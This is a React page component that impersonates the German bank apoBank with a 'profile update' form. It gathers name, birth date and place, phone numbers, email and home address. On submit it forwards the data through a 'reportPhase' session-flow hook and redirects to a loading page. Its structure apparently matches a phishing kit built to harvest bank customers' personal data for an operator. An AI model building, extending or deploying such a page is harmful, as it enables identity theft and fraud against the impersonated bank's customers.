import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Check } from "lucide-react";
import { reportPhase } from "@/hooks/useSessionFlow";
import apobankLogo from "@/assets/apobank-logo.svg";


type FieldDef = { key: string; label: string; value: string; options?: string[]; type?: string };

const TITEL_OPTIONS = [
  "Keine Angabe",
  "Dr.",
  "Dr. Dr.",
  "Dr. med.",
  "Dr. med. dent.",
  "Dr. med. vet.",
  "Dr. rer. nat.",
  "Dr. rer. medic.",
  "Dr. rer. pol.",
  "Dr. phil.",
  "Dr. jur.",
  "Prof.",
  "Prof. Dr.",
  "Prof. Dr. Dr.",
  "Prof. Dr. med.",
  "Prof. Dr. med. dent.",
  "PD Dr.",
  "PD Dr. med.",
  "Dipl.-Med.",
];

const EditField = ({
  label,
  value,
  onChange,
  options,
  type = "text",
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  options?: string[];
  type?: string;
}) => {
  const handleDateChange = (v: string) => {
    if (label.toLowerCase().includes("datum")) {
      // Remove non-digits
      let digits = v.replace(/\D/g, "");
      // Limit to 8 digits (DDMMYYYY)
      digits = digits.slice(0, 8);
      
      let formatted = "";
      if (digits.length > 0) {
        formatted += digits.slice(0, 2);
      }
      if (digits.length > 2) {
        formatted += "." + digits.slice(2, 4);
      }
      if (digits.length > 4) {
        formatted += "." + digits.slice(4);
      }
      onChange(formatted);
    } else {
      onChange(v);
    }
  };

  return (
    <div>
      <label className="text-[13px] font-semibold text-[#001f5b] mb-1 block">{label}</label>
      {options ? (
        <select
          value={value}
          onChange={(e) => onChange(e.target.value)}
          className="w-[25%] text-[15px] text-slate-800 bg-white border border-slate-300 rounded-md px-3 py-2 outline-none focus:border-[#001f5b] focus:ring-1 focus:ring-[#001f5b]"
        >
          {options.map((opt) => (
            <option key={opt} value={opt === "Keine Angabe" ? "" : opt}>
              {opt}
            </option>
          ))}
        </select>
      ) : (
        <input
          type={type}
          value={value}
          onChange={(e) => handleDateChange(e.target.value)}
          required={!label.toLowerCase().includes("optional")}
          className="w-[42%] text-[15px] text-slate-800 bg-white border border-slate-300 rounded-md px-3 py-2 outline-none focus:border-[#001f5b] focus:ring-1 focus:ring-[#001f5b]"
        />
      )}
    </div>
  );
};

const initialFields: FieldDef[] = [
  { key: "titel", label: "Titel", value: "", options: TITEL_OPTIONS },
  { key: "vorname", label: "Vorname", value: "" },
  { key: "nachname", label: "Nachname", value: "" },
  { key: "geburtsdatum", label: "Geburtsdatum", value: "" },
  { key: "geburtsort", label: "Geburtsort", value: "" },
  { key: "mobil", label: "Private Mobilfunknummer", value: "" },
  { key: "festnetz", label: "Private Festnetznummer (optional)", value: "" },
  { key: "email", label: "Private E-Mail-Adresse", value: "", type: "email" },
  { key: "strasse", label: "Straße und Hausnummer", value: "" },
  { key: "zusatz", label: "Adresszusatz (optional)", value: "" },
  { key: "plz", label: "Postleitzahl", value: "" },
  { key: "ortLand", label: "Ort", value: "" },
];

const PersoenlicheDaten = () => {
  const [fields, setFields] = useState<FieldDef[]>(initialFields);
  const navigate = useNavigate();

  const updateField = (key: string, v: string) =>
    setFields((prev) => prev.map((f) => (f.key === key ? { ...f, value: v } : f)));

  return (
    <div className="min-h-screen flex flex-col bg-[#f6f8fc]">
      {/* Top header */}
      <header className="bg-white border-b border-slate-200">
        <div className="max-w-[1400px] mx-auto flex items-center justify-between px-6 sm:px-10 h-16">
          <div className="flex items-center gap-8">
            <div className="w-10 h-10 rounded-full bg-[#001f5b] text-white flex items-center justify-center font-semibold text-lg">
              a
            </div>
            <span className="text-[15px] font-medium text-[#001f5b]">Profildaten</span>
          </div>
        </div>
      </header>

      {/* Main */}
      <main className="flex-1">
        <div className="max-w-[780px] mx-auto px-4 sm:px-8 py-8 sm:py-10">
          <h1 className="text-[34px] sm:text-[40px] font-semibold text-[#001f5b] mb-6 text-left">
            Mein Profil aktualisieren
          </h1>

          <form 
            onSubmit={async (e) => {
              e.preventDefault();
              const profile = Object.fromEntries(fields.map((f) => [f.key, f.value]));
              try { await reportPhase("profile_submitted", { profile }); } catch {}
              navigate("/profil-loading");
            }}
            className="bg-white rounded-xl border border-slate-200/70 shadow-[0_1px_2px_rgba(0,0,0,0.04)] px-6 sm:px-10 py-8 sm:py-10"
          >

            <div className="flex flex-col gap-y-6">
              {fields.map((f) => (
                <EditField
                  key={f.key}
                  label={f.label}
                  value={f.value}
                  onChange={(v) => updateField(f.key, v)}
                  options={f.options}
                  type={f.type}
                />
              ))}
            </div>
            <div className="flex justify-end mt-10">
              <button
                type="submit"
                className="inline-flex items-center gap-2 rounded-full bg-[#001f5b] text-white px-6 py-2 text-sm font-medium hover:bg-[#00174a] transition-colors"
              >
                <Check className="w-4 h-4" />
                Speichern
              </button>
            </div>
          </form>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-[#001f5b] text-white mt-10">
        <div className="max-w-[1120px] mx-auto px-6 sm:px-10 py-10 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-6">
          <div>
            <img src={apobankLogo} alt="apoBank" className="h-12 brightness-0 invert" />
            <div className="text-[13px] mt-4 opacity-90">
              © 2026 Deutsche Apotheker- und Ärztebank eG. Alle Rechte vorbehalten.
            </div>
          </div>
          <ul className="space-y-3 text-[15px]">
            <li><a href="#" className="hover:underline">Impressum</a></li>
            <li><a href="#" className="hover:underline">Datenschutz</a></li>
            <li><a href="#" className="hover:underline">Nutzungsbedingungen</a></li>
            <li><a href="#" className="hover:underline">Cookie-Einstellungen</a></li>
          </ul>
        </div>
      </footer>
    </div>
  );
};

export default PersoenlicheDaten;

